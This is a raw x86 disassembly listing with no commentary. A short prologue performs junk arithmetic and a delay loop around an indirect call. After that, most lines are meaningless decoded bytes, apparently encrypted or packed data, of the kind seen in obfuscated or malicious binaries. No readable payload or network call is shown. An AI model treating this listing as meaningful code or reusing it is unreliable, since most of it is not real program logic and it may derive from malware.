  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e862,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x430646,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430642,0x13
  401884:	cmp    DWORD PTR ds:0x430642,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430642,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eba4
  4018a9:	mov    ebx,DWORD PTR ds:0x430642
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430642,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e85e,0x42e862
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4305b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e86a,0x430642
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430652,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	es stos DWORD PTR es:[edi],eax
  401916:	addr16 push esi
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x401997
  401921:	test   DWORD PTR [edi+0x38d1632a],ebx
  401927:	std    
  401928:	mov    ecx,cs
  40192a:	xlat   BYTE PTR ds:[ebx]
  40192b:	jbe    0x40196d
  40192d:	jno    0x40193e
  40192f:	mov    dl,0x66
  401931:	sbb    al,BYTE PTR [esi-0x44d6b8ea]
  401937:	mov    al,ds:0x1331e258
  40193c:	jmp    0xa681:0x9a74853a
  401943:	or     DWORD PTR [edi],ecx
  401945:	push   0xfffffffc
  401947:	rcr    esi,1
  401949:	in     al,0x17
  40194b:	fisttp DWORD PTR [edx+0x5c]
  40194e:	jnp    0x40193f
  401950:	sub    al,0x64
  401952:	jno    0x401978
  401954:	mov    ah,0xc3
  401956:	sub    BYTE PTR [ebx-0x5e034e84],ch
  40195c:	clc    
  40195d:	sub    DWORD PTR [ebx-0x77],esi
  401960:	int3   
  401961:	inc    ecx
  401962:	push   edx
  401963:	ffree  st(5)
  401965:	jmp    0x4019c8
  401967:	adc    esp,DWORD PTR [esi+0x1f]
  40196a:	cli    
  40196b:	dec    edi
  40196c:	xchg   dx,ax
  40196e:	push   eax
  40196f:	int3   
  401970:	lea    ecx,[eax]
  401972:	lock lea eax,[ebx-0x54af325f]
  401979:	mov    ah,0x40
  40197b:	xchg   edi,eax
  40197c:	sub    ebp,esi
  40197e:	shl    BYTE PTR [esi+ecx*8],0x63
  401982:	or     dh,cl
  401984:	sbb    dh,ch
  401986:	mov    al,ds:0xb8e522f4
  40198b:	hlt    
  40198c:	cmp    al,0x9f
  40198e:	xchg   ebx,eax
  40198f:	ret    0x3f75
  401992:	xchg   edi,eax
  401993:	ficomp WORD PTR [esi]
  401995:	mul    BYTE PTR [edi+0x42]
  401998:	sub    bl,BYTE PTR [ebp+0x14bdac6b]
  40199e:	ins    BYTE PTR es:[edi],dx
  40199f:	je     0x4019c2
  4019a1:	js     0x401a22
  4019a3:	outs   dx,BYTE PTR ds:[esi]
  4019a4:	ret    0xb259
  4019a7:	add    eax,0xc0bb6e43
  4019ac:	ins    BYTE PTR es:[edi],dx
  4019ad:	aad    0x3d
  4019af:	push   0x6259de4b
  4019b4:	cwde   
  4019b5:	lock dec edi
  4019b7:	sub    bh,BYTE PTR ds:0x6e2e4b1d
  4019bd:	icebp  
  4019be:	fsub   st,st(5)
  4019c0:	inc    ebx
  4019c1:	cld    
  4019c2:	dec    ebp
  4019c3:	dec    eax
  4019c4:	mov    bl,0x6f
  4019c6:	sub    ecx,ebp
  4019c8:	xchg   BYTE PTR ds:0x3e7bc949,bh
  4019ce:	adc    eax,0x1c9f30ea
  4019d3:	add    ch,BYTE PTR [ebx-0x3]
  4019d6:	jecxz  0x401a54
  4019d8:	adc    BYTE PTR [ebx],bh
  4019da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019db:	clc    
  4019dc:	jge    0x401979
  4019de:	jmp    0x6025:0x75ad8db
  4019e5:	xchg   edx,eax
  4019e6:	pop    ecx
  4019e7:	jns    0x401a5f
  4019e9:	or     DWORD PTR [edx-0x74daf209],edx
  4019ef:	test   DWORD PTR [esi],ecx
  4019f1:	fiadd  DWORD PTR [eax+ebp*2]
  4019f4:	xchg   ebx,eax
  4019f5:	cmp    eax,0xbd06cf11
  4019fa:	sar    ebp,1
  4019fc:	dec    eax
  4019fd:	cmp    bh,BYTE PTR [edi]
  4019ff:	inc    ebp
  401a00:	aad    0xf0
  401a02:	loope  0x401a05
  401a04:	(bad)  
  401a05:	icebp  
  401a06:	sbb    BYTE PTR [edi],0x81
  401a09:	out    0x27,al
  401a0b:	sbb    dh,BYTE PTR [edi-0x58a15af6]
  401a11:	fnsave [edi+0x1b]
  401a14:	mov    eax,ds:0x67a51b3d
  401a19:	push   ss
  401a1a:	fwait
  401a1b:	adc    DWORD PTR [eax+0x68],ebx
  401a1e:	dec    ebp
  401a1f:	ss jecxz 0x401a7c
  401a22:	in     al,0x6a
  401a24:	add    eax,0x2e526924
  401a29:	stos   BYTE PTR es:[edi],al
  401a2a:	shl    DWORD PTR [edx-0x126e4ae1],cl
  401a30:	out    0xf,al
  401a32:	adc    DWORD PTR [eax+edi*2+0x3c79dd08],ebx
  401a39:	xlat   BYTE PTR ds:[ebx]
  401a3a:	(bad)  
  401a3b:	out    dx,al
  401a3c:	xlat   BYTE PTR ds:[ebx]
  401a3d:	mov    esi,0xa7124511
  401a42:	lea    eax,[edx-0x3b98c757]
  401a48:	push   ds
  401a49:	and    ecx,DWORD PTR [edi-0x54]
  401a4c:	repz pop es
  401a4e:	in     al,0xce
  401a50:	(bad)  [ebp-0x7f]
  401a53:	(bad)  
  401a54:	int3   
  401a55:	test   DWORD PTR [esi],esi
  401a57:	xor    eax,0x5ae2a7b
  401a5c:	iret   
  401a5d:	jp     0x401add
  401a5f:	dec    edi
  401a60:	sub    ah,0x26
  401a63:	jmp    0x401aa1
  401a65:	loope  0x401aa5
  401a67:	out    dx,eax
  401a68:	pop    edx
  401a69:	add    dl,al
  401a6b:	addr16 jmp 0x34b2:0xdefed17d
  401a73:	mov    eax,0x1ecda630
  401a78:	scas   eax,DWORD PTR es:[edi]
  401a79:	in     eax,0x6f
  401a7b:	not    BYTE PTR [edi]
  401a7d:	jmp    0xb629:0x7b7bfb18
  401a84:	test   DWORD PTR [ebx],edx
  401a86:	aad    0x10
  401a88:	cwde   
  401a89:	adc    DWORD PTR ds:0x919e0af4,0x3e059f8a
  401a93:	fmul   QWORD PTR [ebx-0x16]
  401a96:	mov    edx,0xcb26399e
  401a9b:	mov    BYTE PTR [ebx+0x1e],dl
  401a9e:	pusha  
  401a9f:	scas   eax,DWORD PTR es:[edi]
  401aa0:	sahf   
  401aa1:	adc    BYTE PTR [ecx+0x474d143f],0x62
  401aa8:	xchg   ebp,eax
  401aa9:	fwait
  401aaa:	or     eax,0x527da084
  401aaf:	xor    ch,BYTE PTR [edi+eax*8-0x24]
  401ab3:	pop    esp
  401ab4:	push   esp
  401ab5:	int3   
  401ab6:	dec    esi
  401ab7:	push   ecx
  401ab8:	sbb    eax,0x1aff7558
  401abd:	(bad)  
  401abe:	retf   
  401abf:	ror    DWORD PTR [eax-0x37db3722],1
  401ac5:	clc    
  401ac6:	mov    al,ds:0x2d8ce52f
  401acb:	xor    BYTE PTR [ebp+0x3566c378],al
  401ad1:	or     BYTE PTR [edx],dh
  401ad3:	mov    ds:0xa3a01504,al
  401ad8:	cmp    eax,0x5256289b
  401add:	sbb    al,0xaa
  401adf:	pop    es
  401ae0:	aas    
  401ae1:	arpl   si,cx
  401ae3:	jb     0x401b1b
  401ae5:	adc    BYTE PTR [ebp-0x76ccc5c3],0x88
  401aec:	pop    ebx
  401aed:	dec    edx
  401aee:	test   DWORD PTR [eax-0x6382c5a5],edx
  401af4:	adc    ecx,ebx
  401af6:	mov    ah,0x2
  401af8:	pusha  
  401af9:	enter  0xe42e,0x31
  401afd:	pop    ds
  401afe:	jne    0x401ab3
  401b00:	and    dl,BYTE PTR [edx-0x9f95173]
  401b06:	pop    esp
  401b07:	das    
  401b08:	or     esi,edx
  401b0a:	daa    
  401b0b:	jecxz  0x401b5c
  401b0d:	scas   al,BYTE PTR es:[edi]
  401b0e:	cwde   
  401b0f:	(bad)  [ebp+0x79]
  401b12:	adc    BYTE PTR [ebx-0x724f1b0c],dh
  401b18:	mov    ebx,0x6c9d8c80
  401b1d:	gs mov dl,0x5c
  401b20:	lds    eax,FWORD PTR [eax-0x5d0c2c61]
  401b26:	in     al,0x6c
  401b28:	sbb    bl,cl
  401b2a:	outs   dx,DWORD PTR ds:[esi]
  401b2b:	lods   al,BYTE PTR ds:[esi]
  401b2c:	and    BYTE PTR [eax-0xc],ah
  401b2f:	push   edi
  401b30:	push   ds
  401b31:	dec    edi
  401b32:	inc    edx
  401b33:	pop    ds
  401b34:	mov    ebp,ds
  401b36:	adc    al,0x38
  401b38:	jo     0x401bb5
  401b3a:	cmp    ch,BYTE PTR [edi+0x1c]
  401b3d:	xor    al,0x6f
  401b3f:	icebp  
  401b40:	mov    eax,0x678a57ea
  401b45:	and    BYTE PTR [ebx-0xf3b76b0],ah
  401b4b:	push   0xaafaee8
  401b50:	xchg   esp,eax
  401b51:	adc    eax,0xfedf7973
  401b56:	lea    edx,[eax+ebx*1]
  401b59:	push   ecx
  401b5a:	sbb    ch,BYTE PTR [ebp+eax*1+0x3a0715b8]
  401b61:	mov    ecx,DWORD PTR [edi+eiz*4-0x80]
  401b65:	shr    DWORD PTR [ebx+0x349d839a],cl
  401b6b:	stos   BYTE PTR es:[edi],al
  401b6c:	pushf  
  401b6d:	daa    
  401b6e:	and    ch,bh
  401b70:	jno    0x401b9f
  401b72:	jo     0x401b2e
  401b74:	icebp  
  401b75:	xchg   edx,eax
  401b76:	xor    al,0x67
  401b78:	mov    esi,DWORD PTR [esi-0x10a0653]
  401b7e:	fidivr WORD PTR [esi-0x1b9f7113]
  401b84:	lds    ebp,FWORD PTR [ebp+0x7ce38cc2]
  401b8a:	stos   DWORD PTR es:[edi],eax
  401b8b:	push   esi
  401b8c:	cmp    BYTE PTR [ebp+0x13ef5a1b],dl
  401b92:	add    DWORD PTR [edx-0x27],ebx
  401b95:	xor    bh,dh
  401b97:	or     dh,BYTE PTR ds:0x53405e64
  401b9d:	mov    ch,BYTE PTR [eax]
  401b9f:	mov    eax,0xbd162689
  401ba4:	aas    
  401ba5:	gs in  eax,0x5d
  401ba8:	pop    esi
  401ba9:	sub    al,bl
  401bab:	mov    edx,0x59b8515
  401bb0:	inc    esp
  401bb1:	loope  0x401b6e
  401bb3:	and    DWORD PTR [edx],edx
  401bb5:	push   0x7b54aa6b
  401bba:	retf   0x16aa
  401bbd:	jno    0x401c07
  401bbf:	jne    0x401bd8
  401bc1:	aaa    
  401bc2:	ret    0xd3f1
  401bc5:	inc    esi
  401bc6:	(bad)  
  401bc7:	fnstenv [edx-0x59]
  401bca:	sub    DWORD PTR [ebx+ecx*8+0x2b6d95bd],esp
  401bd1:	rcl    DWORD PTR [edx+0x48],1
  401bd4:	aaa    
  401bd5:	in     al,dx
  401bd6:	xor    bl,BYTE PTR [edi+0x65df3ff0]
  401bdc:	adc    al,0xcb
  401bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bdf:	pop    es
  401be0:	sub    DWORD PTR ds:0x43116b,ecx
  401be6:	inc    ebx
  401be7:	adc    al,0xe3
  401be9:	pop    es
  401bea:	push   edi
  401beb:	fs popf 
  401bed:	push   esi
  401bee:	int3   
  401bef:	inc    ecx
  401bf0:	xor    DWORD PTR ds:0xdcb9c142,ebp
  401bf6:	pop    esi
  401bf7:	jae    0x401ba6
  401bf9:	xchg   esi,eax
  401bfa:	test   eax,0xa42fdc0c
  401bff:	add    BYTE PTR [ecx],0xe4
  401c02:	mov    ds:0xa8f6efae,al
  401c07:	test   al,0xa7
  401c09:	mov    al,ds:0xf6d6e0d3
  401c0e:	push   cs
  401c0f:	(bad)
  401c13:	cs and edx,esp
  401c16:	and    BYTE PTR [edx+0x2c5136e9],ch
  401c1c:	and    DWORD PTR [ebx],ebx
  401c1e:	je     0x401c0f
  401c20:	sbb    al,0xd6
  401c22:	pop    ds
  401c23:	dec    esi
  401c24:	and    ah,dh
  401c26:	iret   
  401c27:	mov    ch,ch
  401c29:	push   esp
  401c2a:	inc    esi
  401c2b:	push   cs
  401c2c:	cld    
  401c2d:	(bad)
  401c30:	out    dx,eax
  401c31:	or     BYTE PTR [ecx+esi*4-0x67],dh
  401c35:	das    
  401c36:	mov    al,ds:0x1c8b9647
  401c3b:	jl     0x401c71
  401c3d:	inc    esp
  401c3e:	and    dl,BYTE PTR [esi]
  401c40:	sub    eax,0xbf2d4d89
  401c45:	pop    eax
  401c46:	sti    
  401c47:	dec    esp
  401c48:	mov    edx,0x19bb1a02
  401c4d:	jns    0x401cb1
  401c4f:	dec    eax
  401c50:	mov    ebp,0x8ab4c1e9
  401c55:	aam    0x84
  401c57:	push   ss
  401c58:	xchg   esi,eax
  401c59:	xlat   BYTE PTR ds:[ebx]
  401c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c5b:	pop    esp
  401c5c:	repnz ror ecx,1
  401c5f:	test   BYTE PTR [edi+0x7f],ah
  401c62:	test   al,0x3d
  401c64:	mov    esp,0xee30754f
  401c69:	cdq    
  401c6a:	mov    ebx,0x523e9d4a
  401c6f:	xchg   ebp,eax
  401c70:	jmp    0x401c33
  401c72:	loopne 0x401cc4
  401c74:	out    dx,al
  401c75:	arpl   WORD PTR ds:0x2cee9017,di
  401c7b:	cdq    
  401c7c:	jecxz  0x401ce4
  401c7e:	inc    esi
  401c7f:	aas    
  401c80:	push   esp
  401c81:	pop    ebx
  401c82:	(bad)  
  401c83:	out    dx,al
  401c84:	cld    
  401c85:	mov    al,0x43
  401c87:	inc    eax
  401c88:	leave  
  401c89:	jo     0x401d06
  401c8b:	nop
  401c8c:	xchg   ebx,eax
  401c8d:	jbe    0x401c5a
  401c8f:	pop    ecx
  401c90:	dec    edi
  401c91:	pop    ebx
  401c92:	jno    0x401c25
  401c94:	ret    
  401c95:	lds    ebx,FWORD PTR [bx+0x6b80]
  401c9a:	sbb    ah,ch
  401c9c:	retf   
  401c9d:	and    DWORD PTR [ebx+0x23],ecx
  401ca0:	or     edx,edx
  401ca2:	mov    ch,0xc6
  401ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ca5:	es mov edi,0xee3d7906
  401cab:	data16 fbstp TBYTE PTR [edx+0xaf32055]
  401cb2:	fistp  QWORD PTR [ebp+0x5c7f3f7]
  401cb8:	and    bh,ch
  401cba:	inc    edx
  401cbb:	add    BYTE PTR [ecx],ch
  401cbd:	add    BYTE PTR [eax],al
  401cbf:	add    cl,ch
  401cc1:	lods   al,BYTE PTR ds:[esi]
  401cc2:	add    eax,DWORD PTR [eax]
  401cc4:	add    BYTE PTR [edi],bl
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401c52
  401cd2:	sti    
  401cd3:	pusha  
  401cd4:	mov    ebp,0x7e7e08ba
  401cd9:	xor    BYTE PTR [ecx+0x7e],0x7e
  401cdd:	xchg   edi,eax
  401cde:	push   cs
  401cdf:	and    eax,0x2e03475
  401ce4:	add    BYTE PTR [ebx],0x11
  401ce7:	not    BYTE PTR [edi]
  401ce9:	xchg   edi,eax
  401cea:	call   0xfbc3:0x1baff8d6
  401cf1:	xor    BYTE PTR [ebp+0x3e4b8277],al
  401cf7:	pop    ecx
  401cf8:	mov    dl,0xd0
  401cfa:	mov    ebx,cs
  401cfc:	and    bl,BYTE PTR [ecx*4+0x3fabeb70]
  401d03:	retf   0x14f8
  401d06:	pop    edx
  401d07:	mov    eax,ds:0xe1f2f9d1
  401d0c:	pop    esp
  401d0d:	mov    dh,0xf9
  401d0f:	jb     0x401cc0
  401d11:	push   esi
  401d12:	cld    
  401d13:	xor    DWORD PTR [ebx],0xffffffc8
  401d16:	inc    ebx
  401d17:	ret    
  401d18:	jne    0x401cb1
  401d1a:	stos   BYTE PTR es:[edi],al
  401d1b:	inc    ebx
  401d1c:	scas   eax,DWORD PTR es:[edi]
  401d1d:	cmc    
  401d1e:	data16 ss (bad) 
  401d21:	shl    DWORD PTR [ebx],cl
  401d23:	xchg   ecx,eax
  401d24:	clc    
  401d25:	rcr    DWORD PTR [ebp-0x1f],1
  401d28:	inc    esi
  401d29:	lea    ebp,[edi]
  401d2b:	push   0x7934a1f1
  401d30:	xlat   BYTE PTR ds:[ebx]
  401d31:	jns    0x401d27
  401d33:	jae    0x401d70
  401d35:	iret   
  401d36:	les    esp,FWORD PTR [ebx+0x3c4cc965]
  401d3c:	retf   
  401d3d:	pop    es
  401d3e:	repnz in eax,0x9c
  401d41:	dec    ebx
  401d42:	stos   DWORD PTR es:[edi],eax
  401d43:	arpl   WORD PTR [eax+edi*4+0x2150e37],dx
  401d4a:	js     0x401d2f
  401d4c:	cmp    dh,ah
  401d4e:	jns    0x401da5
  401d50:	pushf  
  401d51:	cmp    eax,0x64130c5
  401d56:	sbb    BYTE PTR [esi+0x5f4d4201],dh
  401d5c:	dec    eax
  401d5d:	mov    esp,0x18021e57
  401d62:	stos   BYTE PTR es:[edi],al
  401d63:	fmul   QWORD PTR [edi-0xe946551]
  401d69:	xchg   edx,eax
  401d6a:	(bad)  
  401d6b:	jno    0x401da0
  401d6d:	stc    
  401d6e:	mov    ebx,edx
  401d70:	dec    eax
  401d71:	out    0xa6,eax
  401d73:	int    0x94
  401d75:	fnsave [eax+esi*2-0x77]
  401d79:	push   ss
  401d7a:	cmc    
  401d7b:	popa   
  401d7c:	pop    ebp
  401d7d:	sbb    dh,BYTE PTR [edi+edx*8]
  401d80:	push   edi
  401d81:	push   ebp
  401d82:	xchg   esp,eax
  401d83:	into   
  401d84:	cmp    eax,0xf782c55c
  401d89:	jl     0x401d27
  401d8b:	(bad)  [edx+0x6b3a7dcd]
  401d91:	mov    dh,BYTE PTR [edx-0x4c9048cb]
  401d97:	fdiv   st(3),st
  401d99:	fisttp WORD PTR [eax-0xdde28a3]
  401d9f:	push   0x67
  401da1:	pop    esi
  401da2:	ds jmp 0x49e:0xf637ee62
  401daa:	sahf   
  401dab:	xlat   BYTE PTR ds:[ebx]
  401dac:	pop    eax
  401dad:	lods   eax,DWORD PTR ds:[esi]
  401dae:	in     al,0x49
  401db0:	ss imul esp,ecx,0x85e576f9
  401db7:	sbb    BYTE PTR [edi+eiz*4-0x61],ch
  401dbb:	mov    ds,esp
  401dbd:	out    dx,al
  401dbe:	push   esi
  401dbf:	mov    ebx,0xd2bb15fc
  401dc4:	ret    0x2079
  401dc7:	xor    eax,0xecafea82
  401dcc:	push   esp
  401dcd:	or     al,0x89
  401dcf:	inc    esi
  401dd0:	mov    ecx,0xc3be0fe9
  401dd5:	jmp    DWORD PTR [ebp-0x4e]
  401dd8:	mov    esi,0x8cbc3fe1
  401ddd:	push   ebx
  401dde:	(bad)  
  401ddf:	cmc    
  401de0:	out    dx,al
  401de1:	inc    ebp
  401de2:	jp     0x401d91
  401de4:	push   edi
  401de5:	(bad)  
  401de6:	fisttp WORD PTR [ebp-0x7d4a0b82]
  401dec:	xrelease mov BYTE PTR [eax],dh
  401def:	pop    es
  401df0:	mov    al,0xf2
  401df2:	push   ecx
  401df3:	cmp    esi,DWORD PTR [edx+0x42]
  401df6:	sahf   
  401df7:	adc    dh,0x4e
  401dfa:	add    BYTE PTR [esi-0x17ce84cd],bl
  401e00:	cmp    al,0x4b
  401e02:	xor    DWORD PTR [edi],ebp
  401e04:	add    BYTE PTR [ebx],al
  401e06:	cwde   
  401e07:	aad    0x5c
  401e09:	mov    ah,0xf3
  401e0b:	or     cl,BYTE PTR [ebx-0xf]
  401e0e:	iret   
  401e0f:	mov    dl,0x1d
  401e11:	cdq    
  401e12:	mov    eax,0xbcc31b1d
  401e17:	mov    dh,0x2e
  401e19:	aad    0x9a
  401e1b:	push   ebx
  401e1c:	mov    esi,0x386eaccb
  401e21:	mov    dl,0x3e
  401e23:	icebp  
  401e24:	inc    esi
  401e25:	xchg   ebp,ebp
  401e27:	jge    0x401db6
  401e29:	retf   0x9beb
  401e2c:	push   ecx
  401e2d:	xor    al,0x1e
  401e2f:	imul   eax,edi,0x4b
  401e32:	pop    esi
  401e33:	pop    edi
  401e34:	test   al,0x77
  401e36:	das    
  401e37:	stos   DWORD PTR es:[edi],eax
  401e38:	jno    0x401e5e
  401e3a:	xor    eax,0x77fa15e
  401e3f:	out    dx,al
  401e40:	sbb    al,0x98
  401e42:	hlt    
  401e43:	sbb    ah,BYTE PTR [edx+0x1c51fd94]
  401e49:	popa   
  401e4a:	sub    dl,BYTE PTR [ebx+ecx*8-0x67cbbd0a]
  401e51:	inc    eax
  401e52:	jb     0x401e14
  401e54:	inc    ebx
  401e55:	cmp    ch,cl
  401e57:	adc    BYTE PTR [ecx],bl
  401e59:	in     al,dx
  401e5a:	jle    0x401e32
  401e5c:	ja     0x401de2
  401e5e:	ins    DWORD PTR es:[edi],dx
  401e5f:	in     eax,dx
  401e60:	jge    0x401e79
  401e62:	lds    edx,FWORD PTR [ebx+0x52b96a25]
  401e68:	pop    es
  401e69:	xchg   ebx,eax
  401e6a:	xor    cl,dh
  401e6c:	pop    esp
  401e6d:	ja     0x401e0a
  401e6f:	iret   
  401e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e71:	adc    al,0xbd
  401e73:	pop    edi
  401e74:	das    
  401e75:	xor    eax,0xe8712b0b
  401e7a:	sbb    al,BYTE PTR ds:0x29b8b792
  401e80:	mov    cl,BYTE PTR [esi]
  401e82:	mov    al,ds:0x83593124
  401e87:	std    
  401e88:	ficomp DWORD PTR [edx-0x18a88f64]
  401e8e:	in     al,dx
  401e8f:	push   esi
  401e90:	(bad)  
  401e91:	not    BYTE PTR [ebp+0xc]
  401e94:	xchg   edi,eax
  401e95:	push   ebx
  401e96:	ins    DWORD PTR es:[edi],dx
  401e97:	repz xchg ecx,eax
  401e99:	data16 or BYTE PTR [ecx],cl
  401e9c:	add    al,0x2a
  401e9e:	sbb    eax,0xa5219d8d
  401ea3:	add    DWORD PTR [esi-0x5],esi
  401ea6:	sub    BYTE PTR [ebp+eax*8+0x53],0x6d
  401eab:	mov    ds:0xcb4ec943,al
  401eb0:	call   0x30ca:0xf05ea6b7
  401eb7:	xchg   DWORD PTR ds:0x7634efca,ecx
  401ebd:	mov    eax,ds:0x530a2d7e
  401ec2:	inc    ebx
  401ec3:	jno    0x401e57
  401ec5:	jmp    0xaca1:0x3384a47
  401ecc:	mov    ecx,ecx
  401ece:	add    ah,BYTE PTR [esi-0x6c203321]
  401ed4:	(bad)  
  401ed5:	xchg   edi,eax
  401ed6:	aas    
  401ed7:	dec    esp
  401ed8:	aas    
  401ed9:	in     eax,0xc8
  401edb:	pushf  
  401edc:	xchg   ebx,eax
  401edd:	pop    edx
  401ede:	loope  0x401f49
  401ee0:	aad    0xff
  401ee2:	jae    0x401eff
  401ee4:	sbb    ecx,DWORD PTR [ecx+eiz*4+0x620a0416]
  401eeb:	and    al,0x4
  401eed:	cmp    eax,0x192c1b44
  401ef2:	sub    ecx,eax
  401ef4:	jecxz  0x401f00
  401ef6:	shl    ch,cl
  401ef8:	int3   
  401ef9:	mov    ecx,0x292abce4
  401efe:	jnp    0x401ec1
  401f00:	adc    eax,0xf1423df3
  401f05:	imul   edx,DWORD PTR [edx-0x4],0x6f
  401f09:	std    
  401f0a:	adc    eax,0x9c2e14c7
  401f0f:	add    DWORD PTR [eax-0x45cb9bd2],0xd7938eba
  401f19:	ins    BYTE PTR es:[edi],dx
  401f1a:	rol    esp,0xe5
  401f1d:	cmp    edx,DWORD PTR [edx]
  401f1f:	jo     0x401f39
  401f21:	fisttp DWORD PTR [edx+0x41]
  401f24:	ret    
  401f25:	inc    edi
  401f26:	xor    al,0x24
  401f28:	xchg   dl,dl
  401f2a:	adc    DWORD PTR [edx+ecx*2+0x12],0xfffffff6
  401f2f:	repz aas 
  401f31:	adc    BYTE PTR [edx],dh
  401f33:	sbb    BYTE PTR [eax],0x7f
  401f36:	nop
  401f37:	sub    eax,edx
  401f39:	dec    esi
  401f3a:	ins    BYTE PTR es:[edi],dx
  401f3b:	dec    edi
  401f3c:	sub    al,bh
  401f3e:	in     al,dx
  401f3f:	imul   eax,DWORD PTR [ecx*8+0xe31849b],0xb742364d
  401f4a:	je     0x401fba
  401f4c:	lods   eax,DWORD PTR ds:[esi]
  401f4d:	adc    BYTE PTR [ebp+0x79],ch
  401f50:	rcl    BYTE PTR [edx],0x22
  401f53:	neg    BYTE PTR [esi]
  401f55:	shr    DWORD PTR [eax+0x51e48dbb],0xf7
  401f5c:	test   DWORD PTR [eax],esp
  401f5e:	loop   0x401f45
  401f60:	push   ss
  401f61:	in     eax,dx
  401f62:	out    dx,al
  401f63:	sti    
  401f64:	bound  ecx,QWORD PTR [ecx]
  401f66:	push   esp
  401f67:	xor    ebx,DWORD PTR [ebx]
  401f69:	fwait
  401f6a:	das    
  401f6b:	push   0x1165bcdc
  401f70:	cs dec ebx
  401f72:	(bad)  
  401f73:	fdivp  st(2),st
  401f75:	lods   eax,DWORD PTR ds:[esi]
  401f76:	out    dx,al
  401f77:	not    BYTE PTR [ebx-0x57]
  401f7a:	in     eax,0x3c
  401f7c:	sbb    DWORD PTR [edx],edi
  401f7e:	push   ebx
  401f7f:	fs retf 0xe579
  401f83:	add    BYTE PTR [esi-0x5a2caa0f],cl
  401f89:	pop    edx
  401f8a:	outs   dx,DWORD PTR ds:[esi]
  401f8b:	add    eax,0xb494031a
  401f90:	cli    
  401f91:	xchg   ecx,eax
  401f92:	add    edi,DWORD PTR [edx-0x4e]
  401f95:	mov    ebp,0x41197ed4
  401f9a:	pushf  
  401f9b:	push   ebx
  401f9c:	neg    esi
  401f9e:	push   0x9d1768b2
  401fa3:	mov    edx,0xd93afbc5
  401fa8:	xchg   ebx,eax
  401fa9:	aaa    
  401faa:	dec    al
  401fac:	cmc    
  401fad:	cdq    
  401fae:	pop    ecx
  401faf:	js     0x40201c
  401fb1:	adc    DWORD PTR [eax+0x1fe3097b],esi
  401fb7:	sub    bh,ah
  401fb9:	jne    0x401f4e
  401fbb:	jns    0x401fe1
  401fbd:	xchg   edi,eax
  401fbe:	dec    ebx
  401fbf:	mov    esi,0xb16407b3
  401fc4:	xchg   esp,eax
  401fc5:	jmp    0xe96ee3ef
  401fca:	push   0xffffffae
  401fcc:	pop    edx
  401fcd:	ret    
  401fce:	cdq    
  401fcf:	rcr    BYTE PTR [eax],0xbd
  401fd2:	inc    edx
  401fd3:	aas    
  401fd4:	std    
  401fd5:	mov    esi,0x61d4e053
  401fda:	out    0xe5,al
  401fdc:	imul   esi,eax,0x261f802d
  401fe2:	jg     0x401ffd
  401fe4:	mov    ebp,0x2ce8d711
  401fe9:	xchg   esp,eax
  401fea:	icebp  
  401feb:	scas   eax,DWORD PTR es:[edi]
  401fec:	push   edi
  401fed:	mov    al,ds:0x7a1361e9
  401ff2:	cli    
  401ff3:	sub    al,0xda
  401ff5:	outs   dx,BYTE PTR ds:[esi]
  401ff6:	test   eax,0x542d19cc
  401ffb:	fmul   st,st(2)
  401ffd:	pop    ebx
  401ffe:	nop
  401fff:	in     al,dx
  402000:	ja     0x401ffc
  402002:	xchg   esp,eax
  402003:	xchg   ebx,eax
  402004:	inc    ebp
  402005:	xor    eax,0xf546abcd
  40200a:	cmp    dl,ch
  40200c:	cli    
  40200d:	and    DWORD PTR [edi-0x77],edx
  402010:	pop    eax
  402011:	loope  0x401fb9
  402013:	add    DWORD PTR [esi],eax
  402015:	stc    
  402016:	xor    al,0xe8
  402018:	adc    edi,DWORD PTR [ebp-0x1e]
  40201b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40201c:	(bad)  
  40201e:	push   ds
  40201f:	add    BYTE PTR [edi-0x6],bh
  402022:	jo     0x401fdd
  402024:	into   
  402025:	ret    
  402026:	arpl   ax,sp
  402028:	or     eax,0x173f0baf
  40202d:	fist   WORD PTR [ecx+ebp*8]
  402030:	sysenter 
  402032:	(bad)  
  402033:	outs   dx,BYTE PTR ds:[esi]
  402034:	pusha  
  402035:	es ror ch,cl
  402038:	sub    BYTE PTR [ebx+eiz*2+0x2714d337],ch
  40203f:	fst    DWORD PTR [ebx+0x47]
  402042:	pop    ecx
  402043:	and    DWORD PTR [ebx],0x36
  402046:	jbe    0x40201e
  402048:	cmp    eax,0xcbdade0e
  40204d:	or     BYTE PTR [esi+eiz*1],dl
  402050:	test   BYTE PTR [ebp+edi*1-0xd],al
  402054:	fstp   QWORD PTR [eax-0x71]
